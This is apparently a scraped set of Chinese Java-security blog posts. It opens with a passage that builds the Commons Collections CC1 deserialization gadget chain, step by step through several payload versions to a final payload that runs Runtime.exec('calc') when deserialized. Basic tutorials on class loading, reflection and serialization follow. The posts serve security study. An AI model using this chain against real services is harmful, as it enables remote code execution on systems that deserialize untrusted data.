var1.getInterfaces()：这一行代码获取了 var1 类对象实现的所有接口，并将它们存储在 var3 数组中。 if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class)：这一行代码是一个条件语句，其中包含三个条件： var1.isAnnotation() 检查 var1 是否是一个注解类型。如果 var1 是一个注解类型，则返回 true。 var3.length == 1 检查 var1 实现的接口数量是否为 1。如果是，则返回 true。 var3[0] == Annotation.class 检查 var1 实现的接口中的第一个接口是否是 Annotation 接口。如果是，则返回 true。 为了满足上述条件，我们初步选择传入 Override.class 作为 var1 的值，于是就得到了 payload1 ： payload1123456789101112131415161718192021222324252627282930313233343536373839public class payload1 &#123; public static void main(String[] args) throws Exception &#123; // 获取 Runtime 对象 Runtime r = Runtime.getRuntime(); // 初始化执行类 InvokerTransformer InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;, &quot;value&quot;); // 初始化利用链 TransformedMap Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, invokerTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationConstructor.setAccessible(true); // 为了通过 isAnnotation 判断，选择将 Override.class 传入第一个参数 Object o = annotationInvocationConstructor.newInstance(Override.class, transformedmap); // serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; 先序列化再反序列化，反序列化时应当弹出计算器。但实际上什么也没发生。原因有很多，先来解决第一个。 Runtime 类不能被序列化解决办法翻看 Runtime 类的定义，会发现它并没有实现 Serializable 接口： 1public class Runtime 要如何解决这个问题呢？在前面的学习中我们能发现 InvokerTransformer 类的 transform 方法能够通过执行任意类的任意方法，假如我们让它执行 Runtime.class 对象的 getDeclaredMethod 方法，并将 getRuntime 作为参数传入，那么我们就能获取到 Runtime 的 getRuntime 方法了。 具体代码如下： 12345Method getRuntimeMethod = (Method)new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class); 其实就相当于这句代码： 1Method getRuntimeMethod = Runtime.class.getDeclaredMethod(&quot;getRuntime&quot;,null) 这样得到的 getRuntimeMethod 就是 Runtime 的 getRuntime 方法了。 接下来我要调用 getRuntimeMethod 方法，还是通过 InvokerTransformer 类的 transform 方法来调用： 12345Runtime r = (Runtime) new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;).transform(getRuntimeMethod); 其实就相当于这句代码： 1Runtime runtime = getRuntimeMethod.invoke(null, null) 执行 getRuntime 方法后返回 Runtime 对象，很合理。 接下来我要调用这个 Runtime 对象的 exec 方法，依然是通过 InvokerTransformer 类的 transform 方法来调用： 1new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime); 其实就相当于这句代码： 1runtime.exec(&quot;calc&quot;) 经过上面的三步操作就可以调用 exec 恶意函数了。但其实这段代码还可以再优雅一点，可以用 ChainedTransformer 类来简化操作。 ChainedTransformer 类利用 ChainedTransformer 可将上述三段代码简化成如下代码： 12345678910Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); 要了解具体原理，我们可以查看 chainedTransformer 类的构造方法： 123public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers;&#125; 可以看到，构造方法中接收一个 Transformer 数组，并将这个数组赋值给 this.iTransformers 。 而 iTransformers 是 ChainedTransformer 中定义的属性： 1private final Transformer[] iTransformers; 接着来看 chainedTransformer 类的 transform 方法： 1234567public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; chainedTransformer 类的 transform 方法遍历 iTransformers 数组中的每一个元素并依次执行它们的 transform 方法，并将前一个 transform 方法的结果作为后一个 transform 方法的参数。 看到这里就应该大致能明白了，就是把数组中的每一个 InvokerTransformer 对象取出来再调用它们的 transform 方法，并把上一段代码的输出作为下一段代码的输入，这样就完美替代了上面的三段代码。于是我们得到 payload2： payload2123456789101112131415161718192021222324252627282930313233343536373839404142public class payload2 &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类 InvokerTransformer 的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 随便构造一个 Map 对象作为 TransformedMap.decorate 的参数 HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;, &quot;value&quot;); // 初始化利用链 TransformedMap Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationConstructor.setAccessible(true); // 为了通过 isAnnotation 判断，选择将 Override.class 传入第一个参数 Object o = annotationInvocationConstructor.newInstance(Override.class, transformedmap); serialize(o); // unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; payload2 解决了 Runtime 类不能被序列化的问题，在序列化时，由于 ChainedTransformer 的 transform 方法并没有被执行，所以并没有生成 Runtime 对象，只有在反序列化 readObject 时才被执行。 但是 payload2 还是无法使用，这是因为 AnnotationInvocationHandler 类的 readObject 方法中的最后一个 while 循环中还有两个判断没绕过，以及 var5 的 setValue 方法的参数还没有作控制。 判断绕过这里再贴一下 AnnotationInvocationHandler 类的 readObject 方法：1234567891011121314151617181920212223242526private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Map.Entry var5 = (Map.Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) &#123; Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125;&#125; 第一重判断 if (var7 != null) 绕过为了经过第一重判断，我们需要追本溯源，看看 var7 是怎么来的： 1Class var7 = (Class)var3.get(var6); var7 是通过 var3 的 get 方法获取到的，看看 var3 是怎么来的： 1Map var3 = var2.memberTypes(); var3 是通过 var2 的 memberTypes 方法获取到的 Map 对象，因此 var3 的 get 方法应当是根据键返回对应的值。 看看 var2 怎么来的： 1234567AnnotationType var2 = null;try &#123; var2 = AnnotationType.getInstance(this.type);&#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);&#125; var2 是一个 AnnotationType 对象，见名知义，就是注解类型。这里是调用了 AnnotationType.getInstance 方法再将 this.type 作为参数传入。 而 type 是 AnnotationInvocationHandler 类中定义的一个属性： 1private final Class&lt;? extends Annotation&gt; type; 与 memberValues 一同在构造方法中被赋值： 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123; this.type = var1; this.memberValues = var2; &#125; else &#123; throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); &#125;&#125; 可以看到 this.type 其实就是我们传入的注解类 Override.class 。 梳理一下上面的过程 传入的 Override.class 就是 AnnotationInvocationHandler 类的 type 属性值； type 属性值被传入 AnnotationType.getInstance 方法作为参数，得到的返回值就是 var2 ，而 AnnotationType 类的 getInstance 方法会返回一个包含指定注解的信息的 AnnotationType 对象； 接下来调用 var2 的 memberTypes 方法获取 var2 的 memberTypes 属性，并将其赋值给 var3。memberTypes 属性的值是在 AnnotationType.getInstance 方法调用时被赋予的，即传入的指定注解（Override.class）的成员属性的类型。由于 Override 类并没有成员属性，所以 memberTypes 为空，所以 var3 也为空。 那么接下来通过 var3 的 get 方法获取到的 var7 自然也为空。 解决方案 为了解决这个问题，只需要传入一个有成员属性的注解类即可，这里选择 Target.class（选其他的也可以，比如 Retention.class）： 123456789101112@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)public @interface Target &#123; /** * Returns an array of the kinds of elements an annotation type * can be applied to. * @return an array of the kinds of elements an annotation type * can be applied to */ ElementType[] value();&#125; 并且在调用 var3 的 get 方法时需要传入一个参数 var6 ，所以需要修改 var6 为此时 var3 中存在的键名 value（这个键名是通过调试知道的，后面会调试），这样就能顺利地调用 get 方法获取键名中的键值了。 var6 是这样来的 12Map.Entry var5 = (Map.Entry)var4.next();String var6 = (String)var5.getKey(); 前面在分析入口类 AnnotationInvocationHandler 的 readObject 方法时，我们讲到 var5 应该是一个 MapEntry 对象，这个对象中存储的键值对其实就是我们给 TransformedMap.decorate 方法传入的 map 参数，那么我们直接修改传入的键为 value 即可。 于是得到 payload3： payload3123456789101112131415161718192021222324252627282930313233343536373839404142public class payload3 &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 构造一个 Map 对象，键为 value HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;, &quot;test&quot;); // 初始化利用链 TransformedMap Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationConstructor.setAccessible(true); // 将有成员属性的 Target.class 传入 Object o = annotationInvocationConstructor.newInstance(Target.class, transformedmap); // serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; 第二重判断 if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) 绕过我们通过调试 payload3 来查看此时的 var7 ，var8 分别是什么，顺便解答一下前面的疑惑。 payload3 中在 readObject 处下一个断点： AnnotationInvocationHandler 类的 readObject 方法下四个断点： 开始调试，直接跳断点就可以了： 接下来我们来看 var2 在初始化之后是什么： 可以看到 var2 是一个 AnnotationType 对象，而且其 memberTypes 属性是一个 HashMap 对象，其中的键值对是 “value” -&gt; Target 成员属性的类型 ElementType 。 看看 var3 被赋值后是什么： var3 获取到的是 var2 的 memberTypes 属性值。 看看 var7 被赋值后是什么： var7 获取到的就是 var3 键值对中的值。由于 var7 不为空，进入判断。 **看看 var8 被赋值后是什么，断点不够了再加俩断点： ** var8 获取到的是 payload3 中传入的 map 值，这也在预期之中。 接下来单步进入判断，想不到直接就过去了： 点进 var7 的 isInstance 方法去看了一下，在文档中发现这个方法与 instanceof 等效，instanceof 是判断其左边对象是否为其右边类的实例 ，而 isInstance 是 Class 类中的方法，也是用于判断某个实例是否是某个类的实例化对象，但是指向则相反： 这样就解释得通了，var8 并不是 ElementType 类的对象，var8 也并不是 ExceptionProxy 类的对象，所以这个判断直接过了。 那么就只剩下最后一个问题了：var5 的 setValue 方法参数不可控。 var5 的 setValue 方法参数不可控解决办法按道理，我们想让 var5 的 setValue 方法参数为 Runtime.class ，但是这里的参数明显不能让我们达成目的。这就要提到 Transformer 接口的一个子类 ConstantTransformer 了。 ConstantTransformer 类123456789101112131415161718192021public class ConstantTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = 6374440726369055124L; public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null); private final Object iConstant; public static Transformer getInstance(Object constantToReturn) &#123; return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn)); &#125; public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; public Object getConstant() &#123; return this.iConstant; &#125;&#125; 看 ConstantTransformer 类的 transform 方法会发现：无论传入什么参数，都返回 this.iConstant ，而 iConstant 属性在 ConstantTransformer 的构造方法中被赋值，这个构造方法又被 public 修饰，所以可以直接调用。 那么我们可以将 ConstantTransformer 的 iConstant 属性赋值成 Runtime.class ，然后将其放在 ChainedTransformer 调用链的最上层，这样无论传入什么，ConstantTransformer 的 transform 方法都会返回 Runtime.class 作为下一个 transform 方法的参数。 于是我们得到最终 payload ： 最终 payload1234567891011121314151617181920212223242526272829303132333435363738394041424344public class FinalPayload &#123; public static void main(String[] args) throws Exception &#123; // 获取包含执行类的 ChainedTransformer 对象 Transformer[] transformers = new Transformer[]&#123; // 将传入参数固定为 Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 构造一个 Map 对象，键为 value HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;, &quot;test&quot;); // 初始化利用链 TransformedMap Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer); // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationConstructor.setAccessible(true); // 将有成员属性的 Target.class 传入（也可以用其他的注解类比如 Retention.class） Object o = annotationInvocationConstructor.newInstance(Target.class, transformedmap); // serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; &#125;&#125; 结语有时候跳源码看会发现源码晦涩难懂，不如直接调试看结果，根据结果修改输入的参数。 Ref：https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#IL3zn","categories":["Java 安全"]},{"title":"基础篇 - Java 的类加载与反射","path":"/2024/05/10/Java 安全/基础篇-Java的类加载与反射/","content":"本文介绍了 Java 的类加载与反射机制，概括了获得 Class 对象的几种方式，以及总结了反射获取类信息的方法。 类加载机制概述class 文件由类装载器装载后，在 JVM 中将形成一份描述 Class 结构的元信息对象，通过该元信息对象可以获知 Class 的结构信息：如构造函数，属性和方法等，Java 允许用户借由这个 Class 相关的元信息对象间接调用 Class 对象的功能。 虚拟机把描述类的数据从 class 文件加载到内存，并对数据进行校验，转换解析和初始化，最终形成可以被虚拟机直接使用的 Java 类型，这就是虚拟机的类加载机制。 类加载器ClassLoader ：Java 中的一个抽象类，位于 java.lang 包中，用于实现类的加载机制。 在 Java 中，有三种主要的类加载器： Bootstrap ClassLoader（启动类加载器）： 这是 Java 虚拟机（JVM）自身的一部分，负责加载 Java 的核心类库，如 java.lang 等。它是用本地代码实现的，无法直接在 Java 代码中访问。 Extension ClassLoader（扩展类加载器）： 这个类加载器负责加载 Java 的扩展库，位于 $JAVA_HOME/lib/ext 目录下的 JAR 文件中的类。它是由 sun.misc.Launcher$ExtClassLoader 类实现的。 System ClassLoader 或 Application ClassLoader（系统类加载器或应用程序类加载器）： 这个类加载器负责加载应用程序的类路径（Classpath）中指定的类，包括用户自定义的类。它是由 sun.misc.Launcher$AppClassLoader 类实现的。 获得 Class 对象的几种方式比如现在有一个类 com.newer.test.Student ，获取该类的 class 对象有以下四种方式 通过类名.class 1Class c1 = Student.class; 通过对象的 getClass() 方法，stu 是 Student 类的对象 1Class c2 = stu.getClass(); 通过类加载器获得 class 对象 12ClassLoader classLoader = ClassLoader.getSystemClassLoader();Class c3 = classLoader.loadClass(&quot;com.newer.test.Student&quot;); 通过 Class.forName() 获得 Class 对象 1Class c4 = Class.forName(&quot;com.newer.test.Student&quot;); 反射机制概述反射（Reflection） 是 Java 程序开发语言的特征之一，它允许运行中的 Java 程序对自身进行检查，或者说“自审”，并能直接操作程序的内部属性和方法。 通过反射调用方法的流程反射调用一般分为 3 个步骤： 得到要调用类的 Class 对象 得到要调用的类的方法（Method） 方法调用（invoke） 代码示例： 加载 “com.newer.test.Student” 类，并返回对应的 Class 对象： 1Class cls = Class.forName(&quot;com.newer.test.Student&quot;); 获取名为 “hi”、参数类型为 int 和 String 的方法，并返回对应的 Method 对象： 1Method m = cls.getDeclaredMethod(&quot;hi&quot;,new Class[]&#123;int.class,String.class&#125;); 调用之前获取到的方法： 1m.invoke(cls.newInstance(),18,&quot;zhangsan&quot;); invoke() 方法接收两个参数，第一个参数是要调用方法的对象实例，第二个参数是方法的参数列表。 cls.newInstance() 创建了一个 com.newer.test.Student 的实例，然后调用该实例的 “hi” 方法，传递了参数 18 和 “zhangsan”。 反射获取类的信息获取类构造器 Connstructor&lt;T&gt; getConstructor(Class&lt;?&gt;...parameterTypes)：返回此 Class 对象对应类的带指定形参的 public 构造方法 Constructor&lt;?&gt;[] getConstructors()：返回此 Class 对象对应类的所有 public 构造方法 Constructor&lt;T&gt;[] getDeclaredConstructor(Class&lt;?&gt;...parameterTypes)：返回此 Class 对象对应类的带指定参数的构造方法，所有声明的构造方法均可访问。 Constructor&lt;?&gt;[] getDeclaredConstructors()：返回此 Class 对象对应类的所有声明的构造方法 获取类成员方法 Method getMethod(String name,Class&lt;?&gt;...parameterTypes)：返回此 Class 对象对应类的带指定形参的 public 方法 Method[] getMethods()：返回此 Class 对象对应类的所有 public 方法 Method getDeclaredMethod(string name,Class&lt;?&gt;...parameterTypes)：返回此 Class 对象对应类的带指定形参的方法 Method[] getDeclaredMethods():返回此 Class 对象对应类的全部方法 获取类成员变量 Field getField(String name)：返回此 Class 对象对应类的指定名称的 public 成员变量 Field[] getFields()：返回此 Class 对象对应类的所有 public 成员变量 Field getDeclaredField(String name)：返回此 Class 对象对应类的指定名称的成员变量，与成员变量访问权限无关 Field[] getDeclaredFields()：返回此 Class 对象对应类的全部成员变量，与成员变量的访问权限无关 获取类注解 &lt;A extends Annotation&gt;A getAnnotation(Class&lt;A&gt;annotationClass)：尝试获取该 Class 对象对应类上的指定类型的 Annotation ，如果该类型注解不存在，则返回 null &lt;A extends Annotation&gt;A getDeclaredAnnotation(Class&lt;A&gt;annotationClass)：这是 Java 8 中新增的，该方法获取直接修饰该 Class 对象对应类的指定类型的 Annotation ，如果不存在，则返回 null Annotation[] getAnnotations()：返回修饰该 Class 对象对应类上存在的所有 Annotation ，包括从父类继承而来的注解，但是不能获取到私有方法或字段上的注解 Annotation[] getDeclaredAnnotations()：返回修饰该 Class 对象对应类上存在的所有 Annotation ，不包括从父类继承的注解，可以获取到私有方法或字段上的注解 &lt;A extends Annotation&gt;A[] getAnnotationByType(Class&lt;A&gt;annotationClass)：该方法的功能与前面介绍的 getAnnotation() 方法基本相似，但由于 Java8 增加了重复注解功能，因此需要使用该方法获取修饰该类的指定类型的多个 Annotation &lt;A extends Annotation&gt;A[] getDeclaredAnnotationByType(Class&lt;A&gt;annotationClass)：该方法的功能与前面介绍的 getDeclaredAnnotations() 方法相似，也是因为 Java8 的重复注解的功能，需要使用该方法获取直接修饰该类的指定类型的多个 Annotation 获取该类内部类 Class&lt;?&gt;[] getDeclaredClasses()：返回该 Class 队形对应类里包含的全部内部类 获取该类对象所在的外部类 Class&lt;?&gt; getDeclaringClass()：返回该 Class 对象对应类所在的外部类 获取该类对象对应类所实现的接口 Class&lt;?&gt;[] getInterfaces()：返回该 Class 对象对应类所实现的全部接口 获取该类对象对应类所继承的父类 Class&lt;? super T&gt; getSuperclass()：返回该 Class 对象对应类的超类的 Class 对象 获取该类对象对应类的修饰符、所在包、类名等基本信息 int getModifiers()：返回此类或接口的所有修饰符，修饰符由 public 、protected 、private 、final 、static 、abstract 等对应的常量组成，返回的整数应使用 Modifier 工具类的方法来解码，才可以获取真的修饰符 Package getPackage()：获取该类的包 String getName()：以字符串形式返回此 Class 对象所表示的类的简称","categories":["Java 安全"]},{"title":"基础篇 - Java 序列化与反序列化","path":"/2024/05/10/Java 安全/基础篇-Java序列化与反序列化/","content":"Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。本文详细讲解了 Java 序列化与反序列化的实现。 Java 序列化与反序列化概述Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。 序列化与反序列化实现条件只有实现了 Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） Serializable 接口Serializable 接口是 Java 提供的序列化接口，它是一个空接口： 12public interface Serializable &#123;&#125; Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。 Externalizable 接口Externalizable 接口是一个更高级别的序列化机制，它允许类对序列化和反序列化过程进行更多的控制和自定义。 实现了 Externalizable 接口的类可以被序列化，但是它与实现 Serializable 接口的类有所不同，Externalizable 接口的序列化和反序列化方法对对象的状态完全负责，包括对象的所有成员变量。因此，在 writeExternal 和 readExternal 方法中，需要手动指定对象的所有成员变量的序列化和反序列化过程。 类必须显式实现 Externalizable 接口。 类必须实现 writeExternal 和 readExternal 方法来手动指定对象的序列化和反序列化过程。这些方法负责将对象的状态写入和读取到指定的数据流中。 类必须提供一个公共的无参数构造函数，因为反序列化过程需要调用该构造函数来创建对象实例。 以下是代码示例： 1234567891011121314151617181920212223242526272829import java.io.*;public class MyClass implements Externalizable &#123; private int id; private String name; // 必须提供默认的构造函数 public MyClass() &#123;&#125; public MyClass(int id, String name) &#123; this.id = id; this.name = name; &#125; // 实现序列化的方法 @Override public void writeExternal(ObjectOutput out) throws IOException &#123; out.writeInt(id); out.writeUTF(name); &#125; // 实现反序列化的方法 @Override public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123; id = in.readInt(); name = in.readUTF(); &#125;&#125; 其他条件除此之外，反序列化还有一些条件： 对象的所有成员都可序列化：如果一个类实现了 Serializable 接口，但其成员中有某些成员变量不可序列化，则序列化操作会失败。 静态成员变量不参与序列化：静态成员变量属于类级别的数据，不包含在序列化的过程中。 transient 关键字：如果某个成员变量被声明为 transient，则在序列化过程中会被忽略，不会被持久化。 序列化版本号 serialVersionUID：建议显式声明一个名为 serialVersionUID 的静态变量，用于控制序列化的版本。若不声明，Java 会根据类的结构自动生成一个版本号，但建议显式声明以确保序列化的兼容性。 序列化对象要将对象序列化成字节流，可以使用 ObjectOutputStream 类。通过 ObjectOutputStream 的 writeObject() 方法将对象写入输出流。 代码示例： 123456789101112131415161718import java.io.FileOutputStream;import java.io.ObjectOutputStream;public class SerializationExample &#123; public static void main(String[] args) &#123; try &#123; MyClass obj = new MyClass(); FileOutputStream fileOut = new FileOutputStream(&quot;object.ser&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(obj); out.close(); fileOut.close(); System.out.println(&quot;Object has been serialized&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 反序列化字节流要从字节流中反序列化对象，可以使用 ObjectInputStream 类。通过 ObjectInputStream 的 readObject() 方法读取输入流中的对象。 代码示例： 1234567891011121314151617import java.io.FileInputStream;import java.io.ObjectInputStream;public class DeserializationExample &#123; public static void main(String[] args) &#123; try &#123; FileInputStream fileIn = new FileInputStream(&quot;object.ser&quot;); ObjectInputStream in = new ObjectInputStream(fileIn); MyClass obj = (MyClass) in.readObject(); in.close(); fileIn.close(); System.out.println(&quot;Object has been deserialized&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 使用 ObjectOutputStream 与 ObjectInputStream 的注意事项在上面的代码中，使用 ObjectOutputStream（ ObjectInputStream ）之前，先使用了 FileOutputStream（FileInputStream ）来处理数据。 实际上，ObjectOutputStream 需要一个输出流作为参数，因此在使用 ObjectOutputStream 之前，先使用 FileOutputStream 打开文件并创建一个文件输出流对象，以便将对象序列化后的数据写入文件。 同理，ObjectInputStream 是基于输入流的，它需要一个输入流作为参数来读取对象的序列化数据。而 FileInputStream 是一种输入流，用于从文件中读取字节流数据。 此外，重要的一点是： ObjectOutputStream 中进行序列化操作的时候，会判断被序列化的对象是否自己重写了 writeObject 方法，如果重写了，就会调用被序列化对象自己的 writeObject 方法，如果没有重写，才会调用默认的序列化方法。 同理 ObjectInputStream 中进行序列化操作的时候，会判断被序列化的对象是否自己重写了 readObject方法，如果重写了，就会调用被序列化对象自己的 readObject方法，如果没有重写，才会调用默认的序列化方法。 常见的输入输出流除了 FileInputStream（ FileOutputStream）之外，根据条件的不同，还可以使用其他的输入输出流来处理数据。 以下是一些常见的输入输出流以及它们的使用条件： BufferedInputStream（BufferedOutputStream）： 使用条件：当需要对读取或写入的数据进行缓冲以提高性能时，特别是对大文件或网络数据流的读取或写入。 ByteArrayInputStream（ByteArrayOutputStream）： 使用条件：当需要从字节数组中读取数据，或将数据写入到字节数组中时。 ObjectInputStream（ObjectOutputStream）： 使用条件：当需要将输入流中的数据反序列化为对象，或将对象序列化后的数据写入到输出流时。 PipedInputStream（PipedOutputStream）： 使用条件：当需要通过管道与另一个线程进行数据交换时，可用于线程间通信。 DataInputStream（DataOutputStream）： 使用条件：当需要从输入流中以 Java 基本数据类型的格式读取数据，或以 Java 基本数据类型的格式将数据写入输出流时。 FileInputStream（FileOutputStream）： 使用条件：当需要从文件中读取字节数据，或将数据写入文件时。 其他自定义的 InputStream（OutputStream）： 使用条件：如果有特定的需求，可以自定义实现 InputStream（OutputStream）类的子类，来满足自己的需求，比如从特定硬件设备中读取数据等。 序列化版本号 serialVersionUIDJava 的序列化机制是通过判断运行时类的 serialVersionUID 来验证版本一致性的，在进行反序列化时，JVM 会把传进来的字节流中的 serialVersionUID 与本地实体类中的 serialVersionUID 进行比较，如果相同则认为是一致的，便可以进行反序列化，否则就会报序列化版本不一致的异常。 如果没有显示指定 serialVersionUID ，Java 会根据类的结构自动生成一个，这种情况下，只有同一次编译生成的 class 才会生成相同的 serialVersionUID 。 有时候由于 serialVersionUID 发生改变，导致反序列化不能成功，为了不出现这类的问题，可以在要序列化的类中显式的声明一个名为 “ serialVersionUID ” 、类型为 long 的变量，并指定其值： 1private static final long serialVersionUID = 1L; 这样就解决了兼容性问题。","categories":["Java 